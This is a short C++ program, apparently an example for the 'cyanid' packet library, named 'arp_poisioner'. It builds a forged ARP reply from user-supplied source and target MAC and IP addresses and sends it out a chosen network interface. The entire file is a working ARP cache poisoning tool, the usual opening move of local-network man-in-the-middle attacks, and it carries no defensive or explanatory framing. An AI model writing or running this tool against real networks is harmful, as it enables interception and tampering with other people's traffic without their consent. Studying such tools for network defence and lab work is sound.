#include <cyanid.hpp>
#include <iostream>

using namespace std;

int main(int argc, char* argv[])
{
    if(argc < 6) {
        cerr << "Usage: arp_poisioner [interface] "
             << "[sha] [spa] [tha] [tpa]" << endl;
        return 1;
    }

    const string iface      = argv[1];
    const string source_mac = argv[2];
    const string source_ip  = argv[3];
    const string target_mac = argv[4];
    const string target_ip  = argv[5];

    cyanid::device device(iface);

    cout << "Using interface: " << iface << endl
         << "Source MAC addr: " << source_mac << endl
         << "Source IP addr:  " << source_ip << endl
         << "Target MAC add:  " << target_mac << endl
         << "Target IP addr:  " << target_ip << endl;

    cyanid::packet packet(device);

    packet.build<cyanid::builder::arp>()(
            cyanid::builder::arp::REPLY,
            source_mac,
            source_ip,
            target_mac,
            target_ip);

    packet.build<cyanid::builder::ethernet>()(
            target_mac,
            cyanid::builder::arp::ETHER_TYPE);

    size_t bytes_written = packet.dispatch();
    cout << "Wrote " << bytes_written << " bytes to the network" << endl;

    return 0;
}
